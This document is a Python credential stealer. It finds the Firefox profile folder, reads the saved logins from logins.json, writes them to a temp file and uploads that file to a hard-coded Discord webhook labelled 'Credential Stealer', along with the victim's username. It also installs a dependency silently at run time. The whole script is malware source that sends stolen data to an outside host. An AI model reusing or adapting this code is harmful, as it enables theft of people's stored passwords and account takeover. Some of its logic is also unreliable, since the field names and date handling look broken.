import os
import json
import shutil
import sqlite3
from datetime import datetime, timezone

try:
    import discord_webhook
except ImportError:
    print("discord-webhook module not found. Installing...")
    os.system("pip install discord-webhook")

from discord_webhook import DiscordWebhook

WEBHOOK = 'https://discord.com/api/webhooks/10532961154011156/3rgcd3hQJqu0UjmSsauIKajIa-g8VCMEWpGZRJLVCVGQri1nQEgFLThjeGqRVveri'

def getUsername():
    try:
        USERNAME = os.getlogin()
    except Exception as e:
        USERNAME = "None"
    return USERNAME

def my_firefox_datetime(time_in_microseconds):
    return datetime(1970, 1, 1, tzinfo=timezone.utc) + \
           datetime.utcfromtimestamp(time_in_microseconds / 1000000) - \
           datetime(1601, 1, 1, tzinfo=timezone.utc)

def steal_firefox_creds():
    # get the path to the Firefox password database file
    password_db_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles", "*", "logins.json")
    profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    for foldername in os.listdir(profile_path):
        folder_path = os.path.join(profile_path, foldername)
        if os.path.isdir(folder_path):
            password_db_path = os.path.join(folder_path, "logins.json")
            break

    # copy the password database file to a temporary location to avoid access denied errors
    shutil.copyfile(password_db_path, "my_firefox_data.json")

    # open the database file and extract the credentials
    with open("my_firefox_data.json", "r", encoding="utf-8") as f:
        data = json.load(f)

    creds = {}
    for entry in data["logins"]:
        if "http" not in entry["hostname"] and "https" not in entry["hostname"]:
            continue  # skip non-http(s) entries

        url = entry["hostname"] + entry["httpRealm"]
        username = entry["username"]
        password = entry["password"]
        date_created = my_firefox_datetime(entry["timeCreated"])

        if url not in creds:
            creds[url] = []

        creds[url].append({
            "username": username,
            "password": password,
            "date_created": str(date_created),
        })

    os.remove("my_firefox_data.json")
    return creds

webhook = DiscordWebhook(url=WEBHOOK, username="Credential Stealer", content=f"Firefox Credentials from: {getUsername()}")

try:
    firefox_creds = steal_firefox_creds()
    path = os.environ["temp"] + "\\firefox_creds.json"
    with open(path, 'w+') as outfile:
        json.dump(firefox_creds, outfile, indent=4)
    with open(path, "rb") as f:
        webhook.add_file(file=f.read(), filename='firefox_creds.json')
    response = webhook.execute()
    os.remove(path)
except Exception as e:
    webhook.add_content(f"Error while getting Firefox credentials from {getUsername()}: {e}")
    response = webhook.execute()
